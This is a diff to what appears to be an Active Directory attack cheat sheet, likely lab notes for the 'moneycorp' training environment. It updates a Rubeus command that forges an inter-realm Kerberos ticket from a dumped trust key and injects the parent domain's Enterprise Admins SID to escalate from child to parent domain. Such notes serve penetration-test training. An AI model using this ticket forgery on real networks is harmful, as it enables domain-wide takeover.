@@ -1484,14 +1484,19 @@ SafetyKatz "lsadump::trust /patch"
 
 #### Create Referral Ticket
 ```powershell
-# Using trust key to forge inter-realm ticket
+# Using trust key to forge inter-realm ticket with Enterprise Admins SID
 Rubeus evasive-silver 
-  /service:krbtgt/CHILD.PARENT.LOCAL
-  /rc4:trust_key_rc4
-  /sid:S-1-5-21-[CHILD-SID]
-  /user:Administrator
-  /domain:child.parent.local
+  /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL 
+  /rc4:132f54e05f7c3db02e97c00ff3879067 
+  /sid:S-1-5-21-719815819-3726368948-3917688648 
+  /sids:S-1-5-21-335606122-960912869-3279953914-519
+  /ldap 
+  /user:Administrator 
   /nowrap
+
+# /sids parameter adds Enterprise Admins SID from parent domain (ending in -519)
+# This enables impersonating Enterprise Admin in parent domain
+# Output: base64 encoded inter-realm referral ticket
 ```
 
 #### Request TGS for Parent Domain Service
